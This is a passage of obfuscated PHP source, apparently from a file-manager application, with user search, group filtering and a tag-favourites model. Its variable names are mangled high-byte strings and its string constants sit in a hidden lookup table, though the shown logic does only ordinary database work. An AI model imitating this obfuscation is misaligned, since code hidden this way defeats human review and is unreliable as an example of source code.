array($ÉäÓü÷ñ[462], "{$…öö ¼º}\45"); } if (!$…öö ¼º) { $ş³ëúÃ = array(); } if (isset($Êúö¸×í[$ÉäÓü÷ñ[836]])) { $ş³ëúÃ[$ÉäÓü÷ñ[836]] = $Êúö¸×í[$ÉäÓü÷ñ[836]]; } $ş³ëúÃ = $this->parseWhereLike($ş³ëúÃ); $±½ÑæªØ = $this->_makeOrder()->where($ş³ëúÃ)->selectPage(20); if (!$±½ÑæªØ || count($±½ÑæªØ[$ÉäÓü÷ñ[448]]) < 5 && Input::check($…öö ¼º, $ÉäÓü÷ñ[396])) { $£ª©øÒÂ = $this->_searchFromMeta($ÉäÓü÷ñ[549], $…öö ¼º, 10); $¼Ú“òË… = $this->_searchFromMeta($ÉäÓü÷ñ[550], $…öö ¼º, 10); $¢Ìæı· = array_merge($£ª©øÒÂ, $¼Ú“òË…, $±½ÑæªØ[$ÉäÓü÷ñ[448]]); $±½ÑæªØ[$ÉäÓü÷ñ[448]] = array_unique_by_key($¢Ìæı·, $ÉäÓü÷ñ[1796]); $±½ÑæªØ[$ÉäÓü÷ñ[445]][$ÉäÓü÷ñ[446]] = count($±½ÑæªØ[$ÉäÓü÷ñ[448]]); $±½ÑæªØ[$ÉäÓü÷ñ[445]][$ÉäÓü÷ñ[447]] = ceil($±½ÑæªØ[$ÉäÓü÷ñ[445]][$ÉäÓü÷ñ[446]] / $±½ÑæªØ[$ÉäÓü÷ñ[445]][$ÉäÓü÷ñ[442]]); } $this->_listDataApply($±½ÑæªØ[$ÉäÓü÷ñ[448]]); $this->_filterByGroup($±½ÑæªØ, $ÌÄã´Ëï); return $±½ÑæªØ; } private function _filterByGroup(&$²ëêÓø¬, $“•ïˆ²µ) { $şœÇŠÊ  =& $_SERVER[´‹ô¯Œ]; if (!$“•ïˆ²µ) { return $²ëêÓø¬; } foreach ($²ëêÓø¬[$şœÇŠÊ [448]] as $œ¿ÀÊàğ => &$Í¿²ğ‰Â) { $¶õ¿§Í¥ = array_to_keyvalue($Í¿²ğ‰Â[$şœÇŠÊ [1406]], $şœÇŠÊ [12], $şœÇŠÊ [1407]); if (!in_array($“•ïˆ²µ, $¶õ¿§Í¥)) { unset($²ëêÓø¬[$şœÇŠÊ [448]][$œ¿ÀÊàğ]); } } unset($Í¿²ğ‰Â); $²ëêÓø¬[$şœÇŠÊ [448]] = array_values($²ëêÓø¬[$şœÇŠÊ [448]]); $²ëêÓø¬[$şœÇŠÊ [445]] = array($şœÇŠÊ [2257] => count($²ëêÓø¬[$şœÇŠÊ [448]]), $şœÇŠÊ [2255] => $²ëêÓø¬[$şœÇŠÊ [445]][$şœÇŠÊ [442]], $şœÇŠÊ [2254] => 1, $şœÇŠÊ [2256] => 1); } private function _searchFromMeta($ëªéÄ©, $õ‡ãø„Ó, $ÍçüÁßÒ) { $±š® …· =& $_SERVER[´‹ô¯Œ]; $õ‡ãø„Ó = strtolower($õ‡ãø„Ó); $¾ëÕôŞÆ = array($±š® …·[97] => $ëªéÄ©, $±š® …·[453] => array($±š® …·[462], "\x25{$õ‡ãø„Ó}\x25")); $¾ëÕôŞÆ = $this->parseWhereLike($¾ëÕôŞÆ); $³ƒäŒË§ = Model($±š® …·[2534])->where($¾ëÕôŞÆ)->limit($ÍçüÁßÒ)->select(); if (!$³ƒäŒË§) { return array(); } $³ƒäŒË§ = array_to_keyvalue($³ƒäŒË§, $±š® …·[12], $±š® …·[1796]); $ÚÛ´ûß¼ = $this->where(array($±š® …·[1787] => array($±š® …·[7], $³ƒäŒË§)))->select(); if (!$ÚÛ´ûß¼) { return array(); } return $ÚÛ´ûß¼; } private function _listDataApplyItem($îĞ•Şƒ) { $¨ˆ©õ×– = array($îĞ•Şƒ); $this->_listDataApply($¨ˆ©õ×–); return $¨ˆ©õ×–[0]; } private function _listDataApply(&$Å¶¸£¶×) { $¼˜Ä»¾ =& $_SERVER[´‹ô¯Œ]; if (!$Å¶¸£¶×) { return; } array_remove_key($Å¶¸£¶×, $¼˜Ä»¾[981]); $•íÒ–Ä = array_to_keyvalue($Å¶¸£¶×, $¼˜Ä»¾[12], $¼˜Ä»¾[1796]); $this->_listAppendGroup($Å¶¸£¶×, $•íÒ–Ä); $this->_listAppendMeta($Å¶¸£¶×, $•íÒ–Ä); $this->_listAppendSourceRoot($Å¶¸£¶×, $•íÒ–Ä); } private function _listAppendSourceRoot(&$ı‚ Ó¬Æ, $”¨ã·Ú) { $»õşô® =& $_SERVER[´‹ô¯Œ]; $Õ„Áƒõµ = Model($»õşô®[916])->listSourceRoot(SourceModel::TYPE_USER, $”¨ã·Ú); $Õ„Áƒõµ = array_to_keyvalue($Õ„Áƒõµ, $»õşô®[583]); $Õ„Áƒõµ = array_remove_key($Õ„Áƒõµ, $»õşô®[583]); foreach ($ı‚ Ó¬Æ as &$Æ½’‰¬Ô) { $Æ½’‰¬Ô[$»õşô®[90]] = $Õ„Áƒõµ[$Æ½’‰¬Ô[$»õşô®[1796]]] ? $Õ„Áƒõµ[$Æ½’‰¬Ô[$»õşô®[1796]]] : array(); } unset($Æ½’‰¬Ô); } private function _listAppendGroup(&$˜û¼¤÷¤, $ÉºÉ‘±ú) { $ÎªÌ»¨ =& $_SERVER[´‹ô¯Œ]; $¸¡íâœ„ = array($ÎªÌ»¨[1796] => array($ÎªÌ»¨[7], $ÉºÉ‘±ú)); $†âÓ³ò± = Model($ÎªÌ»¨[2091])->where($¸¡íâœ„)->select(); $ÌÁÒö° = array_to_keyvalue($†âÓ³ò±, $ÎªÌ»¨[12], $ÎªÌ»¨[1407]); $ÌÁÒö° = array_remove_value(array_unique($ÌÁÒö°), $ÎªÌ»¨[231]); if (!$ÌÁÒö° || !$†âÓ³ò±) { return; } $¸¡íâœ„ = array($ÎªÌ»¨[1407] => array($ÎªÌ»¨[7], $ÌÁÒö°)); $ëß‹²¨ˆ = Model($ÎªÌ»¨[1405])->field($ÎªÌ»¨[2535])->where($¸¡íâœ„)->select(); $ëß‹²¨ˆ = array_to_keyvalue($ëß‹²¨ˆ, $ÎªÌ»¨[1407]); $†âÓ³ò± = array_to_keyvalue_group($†âÓ³ò±, $ÎªÌ»¨[1796]); foreach ($†âÓ³ò± as &$ä¬È¹î) { $ËÎ²„Ôş = array(); foreach ($ä¬È¹î as $ıËòªï) { if (!$ıËòªï[$ÎªÌ»¨[2105]]) { continue; } $ı æÖ¯¥ = Model($ÎªÌ»¨[585])->listData($ıËòªï[$ÎªÌ»¨[2105]]); $ËÎ²„Ôş[] = array($ÎªÌ»¨[1407] => $ıËòªï[$ÎªÌ»¨[1407]], $ÎªÌ»¨[2536] => $ëß‹²¨ˆ[$ıËòªï[$ÎªÌ»¨[1407]]][$ÎªÌ»¨[32]], $ÎªÌ»¨[598] => $ëß‹²¨ˆ[$ıËòªï[$ÎªÌ»¨[1407]]][$ÎªÌ»¨[598]], $ÎªÌ»¨[499] => $ı æÖ¯¥); } $ä¬È¹î = $ËÎ²„Ôş; } unset($ä¬È¹î); foreach ($˜û¼¤÷¤ as &$Ô×¿ø´à) { $Ô×¿ø´à[$ÎªÌ»¨[1406]] = array(); if (isset($†âÓ³ò±[$Ô×¿ø´à[$ÎªÌ»¨[1796]]])) { $Ô×¿ø´à[$ÎªÌ»¨[1406]] = $†âÓ³ò±[$Ô×¿ø´à[$ÎªÌ»¨[1796]]]; } } unset($Ô×¿ø´à); } public function userAppendGroup($ÔÑ¤‚æ) { $Ö»¤ıÊ¶ =& $_SERVER[´‹ô¯Œ]; if (!$ÔÑ¤‚æ) { return array(); } $this->_listAppendGroup($ÔÑ¤‚æ, array_to_keyvalue($ÔÑ¤‚æ, $Ö»¤ıÊ¶[12], $Ö»¤ıÊ¶[1796])); return $ÔÑ¤‚æ; } private function _listAppendMeta(&$»Àå¾’, $å®‡ê½Ï) { $÷Î¹×  =& $_SERVER[´‹ô¯Œ]; $ƒßşÁÁ¡ = UserJobModel::JOB_KEY; $û¬‰ÎŞ„ = array($÷Î¹× [2089]); $Å¾ç¦Øé = array($÷Î¹× [1796] => array($÷Î¹× [7], $å®‡ê½Ï)); $¸çÎûÁ¬ = Model($÷Î¹× [2512])->where($Å¾ç¦Øé)->select(); $Çæ¦€êÊ = array(); foreach ($¸çÎûÁ¬ as $Çµ™ƒÙÙ) { $÷ò€¾õí = $Çµ™ƒÙÙ[$÷Î¹× [1796]]; if (!isset($Çæ¦€êÊ[$÷ò€¾õí])) { $Çæ¦€êÊ[$÷ò€¾õí] = array(); } $Çæ¦€êÊ[$÷ò€¾õí][$Çµ™ƒÙÙ[$÷Î¹× [97]]] = $Çµ™ƒÙÙ[$÷Î¹× [453]]; } $Ã‡é“”¾ = Model($÷Î¹× [2537]); foreach ($»Àå¾’ as &$ÄÈ«ùş) { $÷ò€¾õí = $ÄÈ«ùş[$÷Î¹× [1796]]; $¢·òç = isset($Çæ¦€êÊ[$÷ò€¾õí]) ? $Çæ¦€êÊ[$÷ò€¾õí] : array(); $ÄÈ«ùş[$÷Î¹× [553]] = array_field_key($¢·òç, $û¬‰ÎŞ„); $ÄÈ«ùş[$÷Î¹× [2538]] = array(); if (isset($¢·òç[$ƒßşÁÁ¡])) { $ÄÈ«ùş[$÷Î¹× [2538]] = $Ã‡é“”¾->getUserJobInfo($¢·òç[$ƒßşÁÁ¡]); } } unset($ÄÈ«ùş); } protected function groupUserAll($ÚÄÙ­º) { $êÅ±Ò§é =& $_SERVER[´‹ô¯Œ]; if (!$ÚÄÙ­º) { return !1; } $»ùä‚‹– = Model($êÅ±Ò§é[2091])->field($êÅ±Ò§é[1796])->where(array($êÅ±Ò§é[1407] => array($êÅ±Ò§é[7], $ÚÄÙ­º)))->select(); $»ùä‚‹– = array_to_keyvalue($»ùä‚‹–, $êÅ±Ò§é[12], $êÅ±Ò§é[1796]); return array_unique($»ùä‚‹–); } public function userSearch($¬µ¶ªı¡, $ÁÃÍ³Áµ = "\52") { return Model($_SERVER[´‹ô¯Œ][611])->where($¬µ¶ªı¡)->field($ÁÃÍ³Áµ)->find(); } } goto B¹‰•¤ÇÎç; d¦İ½±Ğ«ö: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\x72\x5f\x66\141\166"; protected function cacheFunctionAlias($ÓÂ„ËçÔ) { $¢ñÆâÕÅ =& $_SERVER[´‹ô¯Œ]; return array($¢ñÆâÕÅ[2112] => array($¢ñÆâÕÅ[2542] . USER_ID, $¢ñÆâÕÅ[2113])); } protected function listData() { $Ì„û¦ğ£ =& $_SERVER[´‹ô¯Œ]; $·’ìø© = array($Ì„û¦ğ£[1787] => USER_ID, $Ì„û¦ğ£[571] => array($Ì„û¦ğ£[2116], 0)); $ø™ÉÙç¨ = $Ì„û¦ğ£[2543]; $™óöàó¬ = $this->field($ø™ÉÙç¨)->where($·’ìø©)->order($Ì„û¦ğ£[2118])->select(); return $™óöàó¬ ? $™óöàó¬ : array(); } protected function addToTag($‰”ò•®, $âîù¤ù) { $ş±™±Ó¶ =& $_SERVER[´‹ô¯Œ]; if (!Model($ş±™±Ó¶[2266])->listData($âîù¤ù)) { return !1; } if (is_numeric($‰”ò•®)) { $„¼ß‰ÉÍ = Model($ş±™±Ó¶[916])->pathInfo($‰”ò•®); if (!$„¼ß‰ÉÍ) { return !1; } } else { $„¼ß‰ÉÍ = IO::infoSimple($‰”ò•®); if (!$„¼ß‰ÉÍ) { return !1; } $Ø€†ß¨ = $„¼ß‰ÉÍ[$ş±™±Ó¶[32]]; $¾Å‡öñ¿ = $„¼ß‰ÉÍ[$ş±™±Ó¶[33]]; if (isset($„¼ß‰ÉÍ[$ş±™±Ó¶[497]])) { $¾Å‡öñ¿ = $„¼ß‰ÉÍ[$ş±™±Ó¶[497]] == $ş±™±Ó¶[91] ? $ş±™±Ó¶[78] : $ş±™±Ó¶[233]; } } $‹ˆÇŸ¯ğ = array($ş±™±Ó¶[1787] => USER_ID, $ş±™±Ó¶[571] => $âîù¤ù, $ş±™±Ó¶[507] => $‰”ò•®, $ş±™±Ó¶[508] => $¾Å‡öñ¿ ? $¾Å‡öñ¿ : $ş±™±Ó¶[502], $ş±™±Ó¶[506] => $Ø€†ß¨ ? $Ø€†ß¨ : $ş±™±Ó¶[12], $ş±™±Ó¶[2000] => 0); if ($this->where($‹ˆÇŸ¯ğ)->find()) { return !1; } return $this->add($‹ˆÇŸ¯ğ); } protected function removeFromTag($ñ„Éš¨¡, $ûìÃş‰) { $·ò¿ñÆ‹ =& $_SERVER[´‹ô¯Œ]; if (!Model($·ò¿ñÆ‹[2266])->listData($ûìÃş‰)) { return !1; } if (is_array($ñ„Éš¨¡)) { $ñ„Éš¨¡ = array($·ò¿ñÆ‹[7], $ñ„Éš¨¡); } $ÁãØ·ë = array($·ò¿ñÆ‹[1787] => USER_ID, $·ò¿ñÆ‹[571] => $ûìÃş‰, $·ò¿ñÆ‹[507] => $ñ„Éš¨¡); return $this->where($ÁãØ·ë)->delete(); } protected function removeByTag($Î—îü) { $¡õÖÙãØ =& $_SERVER[´‹ô¯Œ]; if (!$Î—îü) { return !1; } $¢Ë‘¬Œ = array($¡õÖÙãØ[1787] => USER_ID, $¡õÖÙãØ[571] => $Î—îü); return $this->where($¢Ë‘¬Œ)->delete(); } protected function removeBySource($ë˜Ä§Í) { $¸§·Şäò =& $_SERVER[´‹ô¯Œ]; if (is_array($ë˜Ä§Í)) { $ë˜Ä§Í = array($¸§·Şäò[7], $ë˜Ä§Í); } $èøÙİƒ² = array($¸§·Şäò[1787] => USER_ID, $¸§·Şäò[571] => array($¸§·Şäò[1106], 0), $¸§·Şäò[507] => $ë˜Ä§Í); return $this->where($èøÙİƒ²)->delete(); } }